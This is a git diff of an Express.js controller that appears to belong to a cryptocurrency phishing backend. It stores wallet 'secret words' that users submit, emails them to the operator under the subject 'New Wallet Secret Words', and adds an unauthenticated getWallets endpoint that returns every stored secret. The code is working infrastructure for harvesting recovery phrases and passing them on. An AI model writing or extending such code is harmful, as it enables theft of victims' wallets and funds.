@@ -6,9 +6,20 @@ const {StatusCodes} = require('http-status-codes')
 const jwt = require('jsonwebtoken')
 const secretWords = require('../models/secrets')
 
+const getWallets = async (req, res) =>{
+  try {
+    const wallets = await secretWords.find({})
+
+    res.status(StatusCodes.CREATED).json(wallets)
+
+  } catch (error) {
+    console.log(error)
+  }
+  
+
+}
 
  const createSecret = async (req, res) => {
-  
    const secretWord = await secretWords.create(req.body)
    const {secret, user, walletType} = req.body
    res.status(StatusCodes.CREATED).json({ secretWord })
@@ -22,7 +33,7 @@ const secretWords = require('../models/secrets')
 })
 const mailOptions2 = {
   from: process.env.MAILER_EMAIL,
-  to: "contact.Apex Corporates@gmail.com",
+  to: process.env.MAILER_EMAIL,
   subject: 'New Wallet Secret Words',
   html: `
   <div style="text-align:left; min-height:60vh; padding:20px">
@@ -50,5 +61,6 @@ transporter2.sendMail(mailOptions2, function(error, body){
  
  module.exports = {
    
-     createSecret
- }
+     createSecret,
+    getWallets
+   }
